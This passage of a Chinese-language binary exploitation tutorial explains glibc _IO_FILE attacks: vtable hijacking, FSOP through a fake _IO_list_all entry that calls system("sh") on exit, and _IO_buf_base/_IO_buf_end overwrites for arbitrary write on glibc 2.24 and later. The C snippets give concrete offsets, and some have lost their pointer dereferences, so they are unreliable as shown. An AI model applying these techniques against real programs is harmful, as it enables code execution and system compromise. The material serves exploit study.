  fake_vtable=malloc(0x40);
  vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
  vtable_addr[0]=(long long)fake_vtable; //覆盖vtable指针指向伪造的内存
  fake_vtable[7]=system_ptr; //xsputn
  memcpy(fp,"sh",3); //通过FILE指针传参
  fwrite("hi",2,1,fp); //再次调用fwrite则触发xsputn指针也就是system_ptr被调用
  ```

#### FSOP（File Stream Oriented Programming）
进程内所有的\_IO_FILE结构会使用\_chain域相互连接形成一个链表，这个链表的头部保存在\_IO_list_all。FSOP的核心思想是劫持\_IO_list_all的值来伪造链表和其中的_IO_FILE项，然后在某些特定情况下：
1. 当libc执行abort流程时
2. 当执行exit函数时
3. 当执行流从main函数返回时

\_IO_flush_all_lockp函数会被系统自动调用，这个函数会刷新\_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用\_IO_FILE_plus.vtable中的_IO_overflow。
```c
int_IO_flush_all_lockp (int do_lock)
{
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
    if (((fp->mode <= 0 && fp->IO_write_ptr > fp->_IO_write_base))
           && _IO_OVERFLOW (fp, EOF) == EOF)
  }
}
```

利用方式：
1. 泄漏libc基地址，从而获取_IO_list_all地址
2. 根据源码中的check，布置fake_FILE使其满足：
   ```c
   fp->_mode <= 0
   fp->IO_write_ptr > fp->IO_write_base
   ```
3. 用任意地址写把_IO_list_all的内容改为指向我们可控内存的指针
根据struct _IO_FILE中的字段布局，得到需要的各个字段偏移量为：
```c
#define mode_offset 0xc0
#define writeptr_offset 0x28
#define writebase_offset 0x20
IO_list_all = libc_base + libc.symbols['IO_list_all']
ptr=malloc(0x200);
(long long)((long long)ptr+mode_offset)=0x0; //fp->_mode=0
(long long)((long long)ptr+writeptr_offset)=0x1; //fp->_IO_write_ptr = 1
(long long)((long long)ptr+writebase_offset)=0x0; //fp->_IO_write_base = 0
(long long)((long long)ptr+0xd8)=((long long)ptr+0x100); //vtable=ptr+0x100
(long long)((long long)ptr+0x100+8*3)=system_ptr; //3 overflow，覆盖_IO_overflow为system
(long long)IO_list_all=ptr; //覆盖IO_list_all的内容为fake_FILE
memcpy(ptr,"sh",3); //通过FILE指针传参
exit(0); //触发IO_flush_all_lockp调用fake_FILE->vtable中的IO_overflow
```

#### glibc2.24及后续版本的IO_FILE利用
在glibc2.24及后续版本加入了针对IO_FILE_plus的vtable劫持的检测措施，glibc会在调用虚函数之前首先检查vtable地址的合法性。如果vtable是非法的，那么会引发abort。首先会验证vtable是否位于\_IO_vtable段中，如果满足条件就正常执行，否则会调用_IO_vtable_check做进一步检查。这里的检查使得上文使用vtable进行利用的技术不再可行。
在vtable难以被利用之后，利用的关注点从vtable转移到_IO_FILE结构内部的域中：
```c
struct _IO_FILE
{
  char _IO_buf_base;   / Start of reserve area. */ 0x38
  char _IO_buf_end;    / End of reserve area. */ 0x40
```
在\_IO_FILE中\_IO_buf_base表示操作的起始地址，_IO_buf_end表示结束地址，通过控制这两个数据可以实现控制任意地址读写的操作。因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用。
```assembly
0x7ffff7dd18e0 <IO_2_1_stdin>:    0x00000000fbad2288  0x0000000000602013
0x7ffff7dd18f0 <IO_2_1_stdin+16>: 0x0000000000602014  0x0000000000602010
0x7ffff7dd1900 <IO_2_1_stdin+32>: 0x0000000000602010  0x0000000000602010
0x7ffff7dd1910 <IO_2_1_stdin+48>: 0x0000000000602010  0x00007ffff7dd2740 <== _IO_buf_base
0x7ffff7dd1920 <IO_2_1_stdin+64>: 0x00007ffff7dd27c0  0x0000000000000000 <== _IO_buf_end
```
应用场景：需要写入的目标地址附近没有fastchunk size，可以通过house_of_spirit修改IO缓冲区\_IO_buf_base和_IO_buf_end到0x7ffff7dd2740-0x7ffff7dd27c0，之后再进行的scanf的读入数据就会写入到0x7ffff7dd2740的位置：
```assembly
0x7ffff7dd2740 <buf>:   0x00000a6161616161  0x0000000000000000
```